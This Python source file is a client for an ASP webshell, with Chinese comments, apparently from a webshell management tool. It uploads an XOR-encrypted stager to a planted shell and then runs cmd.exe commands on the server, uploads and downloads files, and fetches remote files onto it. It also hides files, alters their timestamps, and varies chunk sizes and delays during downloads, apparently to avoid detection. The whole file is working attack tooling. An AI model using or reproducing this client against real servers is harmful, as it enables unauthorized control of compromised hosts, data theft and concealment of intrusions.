import base64
import gzip
import hashlib
import json
import time
from typing import Optional, Dict, Union, List
from datetime import datetime

import requests

from ..base_shell import BaseShell
from ..ReqParameter import ReqParameter
from ..encryptPayload import encryptPayload
from ..custom_request import CustomRequestBuilder
from .aspPayload import AspPayload


class AspShell(BaseShell):
    # ASP Webshell 客户端，基于 XOR + 标记协议。
    def __init__(self, url: str, param_name: str, secret_key: str):
        super().__init__(url, param_name, secret_key)

        self.param_name = param_name
        self.secret_key = hashlib.md5(secret_key.encode()).hexdigest()[:16]
        self.secret_key_bytes = self.secret_key.encode("utf-8")
        self.payload_manager = AspPayload()
        self.encryptPayload = encryptPayload(self.secret_key_bytes)

        self.response_encrypt_type = "xor_base64"
        self.request_format = "form"
        self.request_format_file = None

        self.session = requests.Session()
        self.session.verify = False
        self.session.proxies = None
        self.cookie_name = "X-Request-ID"
        self.timeout = 30

        self.is_initialized = False
        self.system_info = None

        print(f"[DEBUG] AspShell 使用的密钥是: {self.secret_key}")


    def _generate_marker(self, cookie_value: str, secret_key: str):
        left_raw = f"{cookie_value}{secret_key}"
        right_raw = f"{cookie_value}{secret_key}"
        right = base64.b64encode(right_raw.encode("utf-8")).decode("utf-8").rstrip("=")
        left = base64.b64encode(left_raw.encode("utf-8")).decode("utf-8").rstrip("=")
        return left, right
    
    def _generate_binary_marker(self, cookie_value: str, secret_key: str):
        marker_string = cookie_value + secret_key
        marker_bytes = marker_string.encode("utf-8")
        return marker_bytes, marker_bytes

    def init_payload(self, payload_name="mainPayload") -> bool:
        if self.is_initialized:
            return True

        try:
            self.request_cookie = self._generate_random_cookie(32)
            stager_key = self.request_cookie[:16] if len(self.request_cookie) > 16 else self.request_cookie
            print(f"[DEBUG] Stager Key: {stager_key}")

            payload_content = self.payload_manager.getPayload(
                payload_name, self.secret_key, self.param_name, self.cookie_name
            )
            print(f"[DEBUG] Payload Content Start: {payload_content[:20]}")
            
            init_encrypt = encryptPayload(stager_key.encode("utf-8"))
            encrypted_payload = init_encrypt.encryptXorBase64(payload_content)
            print(f"[DEBUG] Encrypted Payload Start (Base64): {encrypted_payload[:20]}")

            response = self.send_http_request(encrypted_payload, is_init_request=True)
            if response and response.status_code == 200:
                self.is_initialized = True
                return True

            print(f"[ERROR] 初始化失败，HTTP状态码: {getattr(response, 'status_code', None)}")
            if response:
                print(f"[ERROR] 原始响应内容: {response.text[:200]}")
            return False
        except Exception as e:
            print(f"[ERROR] 初始化payload失败: {e}")
            return False

    def parse_response_xor_base64(self, response_data: str) -> Optional[bytes]:
        """
        解码响应数据：使用Base64编码的标记定位后Base64解码和XOR解密
        支持纯Base64字符串和JSON格式的响应
        
        Args:
            response_data: 服务器响应的原始数据（Base64格式或JSON格式）
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            # 生成响应的左右标记（Base64格式）
            left_marker_base64, right_marker_base64 = self._generate_marker(self.request_cookie, self.secret_key)
            print(f"[DEBUG] 期望的响应标记 左: {left_marker_base64}, 右: {right_marker_base64}")
            
            # 尝试解析JSON格式（如果是JSON响应，自动查找包含标记的字段）
            if response_data.strip().startswith('{'):
                try:
                    response_json = json.loads(response_data)
                    # 如果是JSON格式，遍历所有字段值查找包含左标记的字段
                    if isinstance(response_json, dict):
                        for key, value in response_json.items():
                            if isinstance(value, str) and left_marker_base64 in value:
                                response_data = value
                                print(f"[DEBUG] 检测到JSON响应，已从 '{key}' 字段提取加密数据")
                                break
                except json.JSONDecodeError:
                    # 不是有效的JSON，继续按纯字符串处理
                    pass
            
            # 查找Base64编码的左右标记位置（无等号版本）
            left_pos = response_data.find(left_marker_base64)
            right_pos = response_data.rfind(right_marker_base64)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的Base64标记 左: {left_marker_base64}, 右: {right_marker_base64}")
                print(f"[DEBUG] 响应数据: {response_data[:100]}...")
                return None
            
            # 提取中间的加密数据（Base64格式，无填充符）
            # Base64标记长度为11字符（8字节二进制 -> 12字符Base64 -> 去除等号后11字符）
            encrypted_data_base64 = response_data[left_pos + len(left_marker_base64):right_pos]
            
            # 重新添加必要的填充符（因为服务端去除了等号）
            missing_padding = (4 - len(encrypted_data_base64) % 4) % 4
            if missing_padding:
                encrypted_data_base64 += '=' * missing_padding
            
            # XOR解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptXorBase64(encrypted_data_base64)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            import traceback
            traceback.print_exc()
            return None
    def parse_response_xor_raw(self, response_data: bytes) -> Optional[bytes]:
        """
        解码响应数据：使用二进制标记定位后XOR解密（xor_raw模式）
        
        Args:
            response_data: 服务器响应的原始二进制数据
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            left_marker, right_marker = self._generate_binary_marker(self.request_cookie, self.secret_key)
            left_pos = response_data.find(left_marker)
            right_pos = response_data.rfind(right_marker)

            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的响应标记 左: {left_marker!r}, 右: {right_marker!r}")
                return None

            encrypted_data = response_data[left_pos + len(left_marker):right_pos]
            decrypted_data = self.encryptPayload.decryptXorRaw(encrypted_data)

            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1F and decrypted_data[1] == 0x8B:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            return decrypted_data

        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def send_http_request(self, encrypted_data, is_init_request=False) -> Optional[requests.Response]:
        # 构建请求体并发送到 ASP 入口。
        try:
            request_data = encrypted_data

            self.custom_request_builder = CustomRequestBuilder(
                secret_key=self.secret_key,
                param_name=self.param_name,
                config_file=self.request_format_file,
            )

            if not is_init_request:
                request_data, content_type = self.custom_request_builder.create_request_body(
                    encrypted_data=encrypted_data, request_format=self.request_format
                )
            else:
                request_data, content_type = self.custom_request_builder.create_request_body(
                    encrypted_data=encrypted_data, request_format="form"
                )

            headers = self.session.headers.copy()
            headers["Content-Type"] = content_type
            self.session.cookies.set(self.cookie_name, self.request_cookie)
            response = self.session.post(
                self.url,
                data=request_data,
                timeout=self.timeout,
                allow_redirects=False,
                headers=headers,
            )
            return response
        except requests.exceptions.Timeout:
            print("[ERROR] 请求超时")
            return None
        except requests.exceptions.ConnectionError:
            print("[ERROR] 连接失败")
            return None
        except Exception as e:
            print(f"[ERROR] 请求失败: {e}")
            return None

    def eval_func(self, class_name: Optional[str], method_name: str, parameter: ReqParameter) -> Optional[bytes]:
        # 参数格式化并处理重试逻辑。
        if class_name:
            parameter.add("className", class_name)
        parameter.add("methodName", method_name)

        formatted_params = parameter.format()
        self.request_cookie = self._generate_random_cookie(32)

        if self.request_format in ("plain", "xml", "json"):
            encrypted_data = self.encryptPayload.encryptXorBase64(formatted_params).rstrip("=")
            req_left, req_right = self._generate_marker(self.request_cookie + "mark", self.secret_key)
            marked_encrypted_data = req_left + encrypted_data + req_right
        elif self.request_format in ("png", "plain_binary"):
            encrypted_data = self.encryptPayload.encryptXorRaw(formatted_params)
            req_left, req_right = self._generate_binary_marker(self.request_cookie + "mark", self.secret_key)
            marked_encrypted_data = req_left + encrypted_data + req_right
        else:
            marked_encrypted_data = self.encryptPayload.encryptXorBase64(formatted_params).rstrip("=")

        max_retries = 3
        for retry_count in range(max_retries + 1):
            response = self.send_http_request(marked_encrypted_data, is_init_request=False)
            if response is None:
                return None
            if response.status_code == 500:
                if retry_count < max_retries:
                    print(f"[DEBUG] 第{retry_count + 1}次重试：重新初始化payload")
                    try:
                        self.init_payload(payload_name="mainPayload")
                        continue
                    except Exception as init_error:
                        print(f"[DEBUG] 重新初始化失败: {init_error}")
                        continue
                print(f"[DEBUG] 重试{max_retries}次后仍然失败，放弃")
                return b"ERROR: Maximum retries exceeded"
            break
        else:
            return b"ERROR: All retries failed"

        if response.status_code == 200 and response.content:
            if "xor_raw" in self.response_encrypt_type:
                return self.parse_response_xor_raw(response.content)
            return self.parse_response_xor_base64(response.content.decode("utf-8", errors="ignore"))
        print(f"[ERROR] HTTP响应失败，状态码: {response.status_code}")
        return None

    def test(self) -> bool:
        parameter = ReqParameter()
        result_bytes = self.eval_func(None, "test", parameter)
        if result_bytes is None:
            print("[ERROR] 连接测试失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        print(f"[DEBUG] 解密后的响应内容: {result_text}")
        return result_bytes == b"ok"
    
    def get_basic_info(self):
        parameter = ReqParameter()
        result_bytes = self.eval_func(None, "getBasicsInfo", parameter)
        if result_bytes is None:
            print("[ERROR] 获取系统信息失败")
            return None
        result_text = self._decode_response_text(result_bytes)
        if not result_text:
            print("[ERROR] 系统信息为空")
            return None

        info_dict = {}
        for line in result_text.strip().split("\n"):
            if ":" in line:
                key, value = line.split(":", 1)
                info_dict[key.strip()] = value.strip()
        self.system_info = info_dict
        return info_dict

    def get_CurrentDir(self):
        current_dir = self.system_info.get("CurrentDir").replace("\\", "/")
        return current_dir or None

    def execute_command(self, command: str):
        total_command = "cmd.exe /c " + command
        parameter = ReqParameter()
        parameter.add("cmdLine", total_command)
        result_bytes = self.eval_func(None, "execCommand", parameter)
        if result_bytes is None:
            print("[ERROR] execute_command执行命令失败")
            return None
        result_text = self._decode_response_text(result_bytes)
        print("[Debug] execute_command执行命令结果：", result_text[:200])
        return result_text

    def copy_file(self, src_file_path: str, dest_file_path: str):
        parameter = ReqParameter()
        parameter.add("srcFileName", src_file_path)
        parameter.add("destFileName", dest_file_path)
        result_bytes = self.eval_func(None, "copyFile", parameter)
        if result_bytes is None:
            print("[ERROR] copy_file执行失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        return result_text.strip().lower().startswith("ok")

    def delete_file(self, file_path: str):
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        result_bytes = self.eval_func(None, "deleteFile", parameter)
        if result_bytes is None:
            print("[ERROR] delete_file执行失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        return result_text.strip().lower().startswith("ok")

    def new_file(self, file_path: str):
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        result_bytes = self.eval_func(None, "newFile", parameter)
        if result_bytes is None:
            print("[ERROR] new_file执行失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        return result_text.strip().lower().startswith("ok")

    def new_dir(self, dir_path: str):
        parameter = ReqParameter()
        parameter.add("dirName", dir_path)
        result_bytes = self.eval_func(None, "newDir", parameter)
        if result_bytes is None:
            print("[ERROR] new_dir执行失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        return result_text.strip().lower().startswith("ok")

    def upload_file(self, file_path: str, file_content: bytes):
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        parameter.add("fileValue", file_content)
        result_bytes = self.eval_func(None, "uploadFile", parameter)
        if result_bytes is None:
            print("[ERROR] upload_file执行失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        return result_text.strip().lower().startswith("ok")

    def download_file(self, file_path: str):
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        result_bytes = self.eval_func(None, "readFile", parameter)
        if result_bytes is None:
            print("[ERROR] download_file执行失败")
            return None
        return result_bytes

    def get_files(self, path: str):
        parameter = ReqParameter()
        parameter.add("dirName", path)
        result_bytes = self.eval_func(None, "getFile", parameter)
        result_text = result_bytes.decode("utf-8", errors="ignore")
        if "ok" not in result_text:
            print(f"[DEBUG] 获取文件列表失败: {result_text}")
            return None
        file_list = self.parse_file_list_text(result_text.split("ok")[1])
        return file_list

    def move_file(self, src_file_path: str, dest_file_path: str):
        parameter = ReqParameter()
        parameter.add("srcFileName", src_file_path)
        parameter.add("destFileName", dest_file_path)
        result_bytes = self.eval_func(None, "moveFile", parameter)
        if result_bytes is None:
            print("[ERROR] move_file执行失败")
            return False
        result_text = self._decode_response_text(result_bytes)
        return result_text.strip().lower().startswith("ok")

    def set_file_time(self, file_path: str, time_list: List[str]) -> bool:
        # time_list = [修改时间, 访问时间, 创建时间]（Unix 秒或 "none"）。
        if not isinstance(time_list, (list, tuple)):
            raise ValueError("time_list 参数必须是列表：[修改时间, 访问时间, 创建时间]")
        if len(time_list) != 3:
            raise ValueError("时间列表必须包含3个元素：[修改时间, 访问时间, 创建时间]")

        time_parts = []
        for t in time_list:
            if t is None or t == "none" or str(t).lower() == "none":
                time_parts.append("none")
            else:
                dt_object = datetime.strptime(str(t), "%Y-%m-%d %H:%M:%S")
                sec_timestamp = dt_object.timestamp()
                time_parts.append(str(int(sec_timestamp)))

        time_attr = "|".join(time_parts)
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        parameter.add("attr", time_attr)
        parameter.add("type", "fileTimeAttr")
        result_bytes = self.eval_func(None, "setFileAttr", parameter)
        result_text = self._decode_response_text(result_bytes)
        if "ok" not in result_text:
            print(f"[DEBUG] 设置文件时间失败: {result_text}")
            return False
        print("[DEBUG] 设置文件时间成功")
        return True

    # 设置文件属性，如"只读","隐藏","系统"等, attributes参数为数字属性位(1,2,4,32)组合
    def set_file_attributes(self, file_path: str, attributes: str) -> bool:
        # attributes 为属性位数字字符串。
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        parameter.add("attr", attributes)
        parameter.add("type", "fileBasicAttr")
        result_bytes = self.eval_func(None, "setFileAttr", parameter)
        result_text = self._decode_response_text(result_bytes)
        if "ok" not in result_text:
            print(f"[DEBUG] 设置文件属性失败: {result_text}")
            return False
        print(f"[DEBUG] 设置文件属性成功: {result_text}")
        return True
    
    def file_remote_download(self, url: str, save_file: str) -> bool:
        parameter = ReqParameter()
        parameter.add("url", url)
        parameter.add("saveFile", save_file)
        result_bytes = self.eval_func(None, "fileRemoteDown", parameter)
        result_text = self._decode_response_text(result_bytes)
        if "ok" not in result_text:
            print(f"[DEBUG] 远程下载文件失败: {result_text}")
            return False
        print(f"[DEBUG] 远程下载文件成功: {result_text}")
        return True

    def get_file_size(self, file_path: str) -> int:
        try:
            parameter = ReqParameter()
            parameter.add("fileName", file_path)
            result_bytes = self.eval_func(None, "getFileSize", parameter)
            result_text = self._decode_response_text(result_bytes)
            return int(result_text.strip())
        except Exception as e:
            print(f"[ERROR] 获取文件大小异常: {e}")
            return None

    def read_file_by_position(self, file_path: str, position: int, read_byte_num: int) -> bytes:
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        parameter.add("position", str(position))
        parameter.add("readByteNum", str(read_byte_num))
        result_bytes = self.eval_func(None, "readFileByPosition", parameter)
        return result_bytes

    def big_file_download(
        self,
        file_path: str,
        save_path: Optional[str] = None,
        chunk_kb_size: Optional[int] = None,
        timeout: float = 0,
        enable_chunk_size_variation: bool = False,
        chunk_size_variation_kb: int = 128,
    ) -> bool:
        # 分块下载文件，降低内存占用。
        try:
            print(f"[INFO] 开始下载大文件: {file_path}")
            file_size = self.get_file_size(file_path)
            if file_size is None:
                print("[ERROR] 无法获取文件大小")
                return False

            if chunk_kb_size is None:
                if file_size < 1 * 1024 * 1024:
                    chunk_kb_size = 64
                elif file_size < 100 * 1024 * 1024:
                    chunk_kb_size = 512
                else:
                    chunk_kb_size = 1024 * 4

            if save_path is None:
                import os
                save_path = os.path.basename(file_path)

            base_chunk_size = chunk_kb_size * 1024
            downloaded_data = b""
            position = 0
            while position < file_size:
                if enable_chunk_size_variation:
                    import random
                    variation_bytes = chunk_size_variation_kb * 1024
                    min_chunk_size = max(1024, base_chunk_size - variation_bytes)
                    max_chunk_size = base_chunk_size + variation_bytes
                    current_chunk_size = random.randint(min_chunk_size, max_chunk_size)
                else:
                    current_chunk_size = base_chunk_size

                remaining_bytes = file_size - position
                actual_chunk_size = min(current_chunk_size, remaining_bytes)
                chunk_data = self.read_file_by_position(file_path, position, actual_chunk_size)
                if len(chunk_data) == 0:
                    print("[ERROR] 读取块失败，数据为空")
                    return False
                downloaded_data += chunk_data
                position += len(chunk_data)
                if timeout > 0:
                    time.sleep(timeout)

            with open(save_path, "wb") as f:
                f.write(downloaded_data)
            return True
        except Exception as e:
            print(f"[ERROR] 大文件下载失败: {e}")
            return False

    def big_file_upload(self, file_path: str, file_data: bytes, position: str = "0") -> bool:
        parameter = ReqParameter()
        parameter.add("fileContents", file_data)
        parameter.add("fileName", file_path)
        parameter.add("position", position)
        result_bytes = self.eval_func(None, "bigFileUpload", parameter)
        if "ok" not in result_bytes.decode("utf-8", errors="ignore"):
            print(f"[DEBUG] 上传大文件失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False
        return True

    def zip(self, compress_paths: Union[str, List[str]], compress_file: str) -> bool:
        try:
            if isinstance(compress_paths, str):
                paths_str = compress_paths
            elif isinstance(compress_paths, (list, tuple)):
                paths_str = "|".join(compress_paths)
            else:
                raise ValueError("compress_paths 必须是字符串或列表")

            parameter = ReqParameter()
            parameter.add("compressPaths", paths_str)
            parameter.add("compressFile", compress_file)
            result_bytes = self.eval_func(None, "zip", parameter)
            result_text = self._decode_response_text(result_bytes)
            #print(f"[DEBUG] 压缩文件结果: {result_text}")
            return result_text.strip().lower().startswith("ok")
        except Exception as e:
            print(f"[ERROR] 压缩文件异常: {e}")
            return False

    def unzip(self, compress_file: str, extract_dir: str) -> bool:
        try:
            parameter = ReqParameter()
            parameter.add("compressFile", compress_file)
            parameter.add("extractDir", extract_dir)
            result_bytes = self.eval_func(None, "unzip", parameter)
            result_text = self._decode_response_text(result_bytes)
            print(f"[DEBUG] 解压文件结果: {result_text}")
            return result_text.strip().lower().startswith("ok")
        except Exception as e:
            print(f"[ERROR] 解压文件异常: {e}")
            return False
    
    def test_function(self):
        """
        用于测试已补全的文件操作方法
        """
        if not hasattr(self, "test_base_dir") or not self.test_base_dir:
            print("[ERROR] test_base_dir未设置，请先设置测试目录路径")
            return None

        base_dir = self.test_base_dir.rstrip("/\\")
        suffix = str(int(time.time()))
        test_dir = f"{base_dir}/test_dir_{suffix}"
        src_file = f"{base_dir}/test_src_{suffix}.txt"
        copy_file = f"{base_dir}/test_copy_{suffix}.txt"
        moved_file = f"{base_dir}/test_moved_{suffix}.txt"

        results: Dict[str, bool] = {}
        results["new_dir"] = self.new_dir(test_dir)
        results["upload_file"] = self.upload_file(src_file, b"test_content")
        downloaded = self.download_file(src_file)
        results["download_file"] = downloaded == b"test_content"
        results["copy_file"] = self.copy_file(src_file, copy_file)
        results["move_file"] = self.move_file(src_file, moved_file)
        results["delete_moved"] = self.delete_file(moved_file)
        results["delete_copy"] = self.delete_file(copy_file)
        results["delete_dir"] = self.delete_file(test_dir)

        print("[DEBUG] test_function结果:", results)
        return results

def main(): 
    import os
    current_dir = os.path.dirname(os.path.abspath(__file__))
    data_dir = os.path.join(current_dir, '../data')
    custom_config_file = os.path.join(data_dir, "request_format_define.json")

    asp_shell = AspShell("http://localhost:82/shell1.asp", "pass", "key")
    asp_shell.test_base_dir = "E:\\Project\\aspweb"
    asp_shell.request_format_file = custom_config_file
    asp_shell.request_format = "plain_binary"
    asp_shell.response_encrypt_type = "xor_raw"
    asp_shell.session.proxies = {
        "http": "http://172.26.32.1:8081"
    }
    if asp_shell.init_payload("mainPayload_xor_raw"):
        print("初始化成功")
        if asp_shell.test():
            print("测试成功")
            print(asp_shell.get_basic_info())
        else:
            print("测试失败")
        #result1 = asp_shell.execute_command("cmd.exe /c whoami")
        #result2 = asp_shell.execute_command("whoami")
        #asp_shell.zip(["E:\\Project\\aspweb\\test1.txt", "E:\\Project\\aspweb\\test2.txt"], "E:\\Project\\aspweb\\test1.zip")
        #asp_shell.unzip("E:\\Project\\aspweb\\test1.zip", "E:\\Project\\aspweb\\test")

        #asp_shell.big_file_download("E:\\Project\\aspweb\\test.bin")
    else:
        print("初始化失败")

if __name__ == "__main__":
    main()
